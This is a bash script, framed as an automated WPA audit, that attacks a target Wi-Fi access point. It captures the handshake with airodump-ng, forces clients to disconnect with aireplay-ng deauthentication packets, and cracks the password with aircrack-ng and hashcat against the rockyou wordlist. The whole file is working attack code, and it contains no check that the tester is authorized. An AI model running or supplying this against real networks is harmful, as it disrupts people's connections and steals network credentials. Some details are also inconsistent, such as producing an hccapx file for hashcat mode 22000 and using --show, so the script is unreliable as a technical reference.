#!/bin/bash

# --- Configuration ---
INTERFACE="wlan0mon"          # Interface in monitor mode
TARGET_BSSID="AA:BB:CC:DD:EE:FF" # MAC address of the target AP
TARGET_CHANNEL="6"            # AP channel
HANDSHAKE_FILE="bash_capture" # Output file prefix
WORDLIST="/usr/share/wordlists/rockyou.txt"
# ---------------------

echo "--- Bash Automated WPA Audit ---"
echo "[+] Target BSSID: $TARGET_BSSID on Channel $TARGET_CHANNEL"

# --- Step 1: Capture WPA Handshake ---
echo ""
echo "[1] Starting airodump-ng in background..."
# airodump-ng is run in the background. Note the ' & '
airodump-ng --bssid $TARGET_BSSID --channel $TARGET_CHANNEL --write $HANDSHAKE_FILE $INTERFACE &
DUMP_PID=$! # Store the Process ID of the background command

# Give airodump a moment to start
sleep 5

echo "[2] Sending deauthentication packets to force a client to reconnect..."
# aireplay-ng command: -0 (deauth attack), 5 (count), -a (AP BSSID)
# Note: For best results, you would also specify a connected -c Client BSSID
aireplay-ng -0 5 -a $TARGET_BSSID $INTERFACE

echo "[3] Waiting a few seconds for handshake capture..."
sleep 15
kill $DUMP_PID # Stop the background airodump process

CAP_FILE="$HANDSHAKE_FILE-01.cap"

if [ -f "$CAP_FILE" ]; then
    echo "[+] Handshake captured in: $CAP_FILE"
    
    # --- Step 2: Crack Handshake with Aircrack-ng ---
    echo ""
    echo "[4] Running Aircrack-ng dictionary attack..."
    # Aircrack-ng will attempt to crack the password from the .cap file
    aircrack-ng -w $WORDLIST $CAP_FILE
    
    # --- Step 3: Crack Handshake with Hashcat (Optional, for better performance) ---
    echo ""
    echo "[5] Converting .cap file for Hashcat (HCCAPX format)..."
    # This utility is often used to convert the file format
	wpaclean $HANDSHAKE_FILE.cleaned.cap $CAP_FILE
    aircrack-ng $HANDSHAKE_FILE.cleaned.cap -j hashcat_output

    if [ -f "hashcat_output.hccapx" ]; then
        echo "[6] Running Hashcat dictionary attack (Mode 22000 for WPA/WPA2)..."
        hashcat -m 22000 hashcat_output.hccapx $WORDLIST --show
    else
        echo "[!] Hashcat conversion failed. Skipping Hashcat attempt."
    fi

else
    echo "[!] Capture file $CAP_FILE not found. Handshake capture failed."
fi
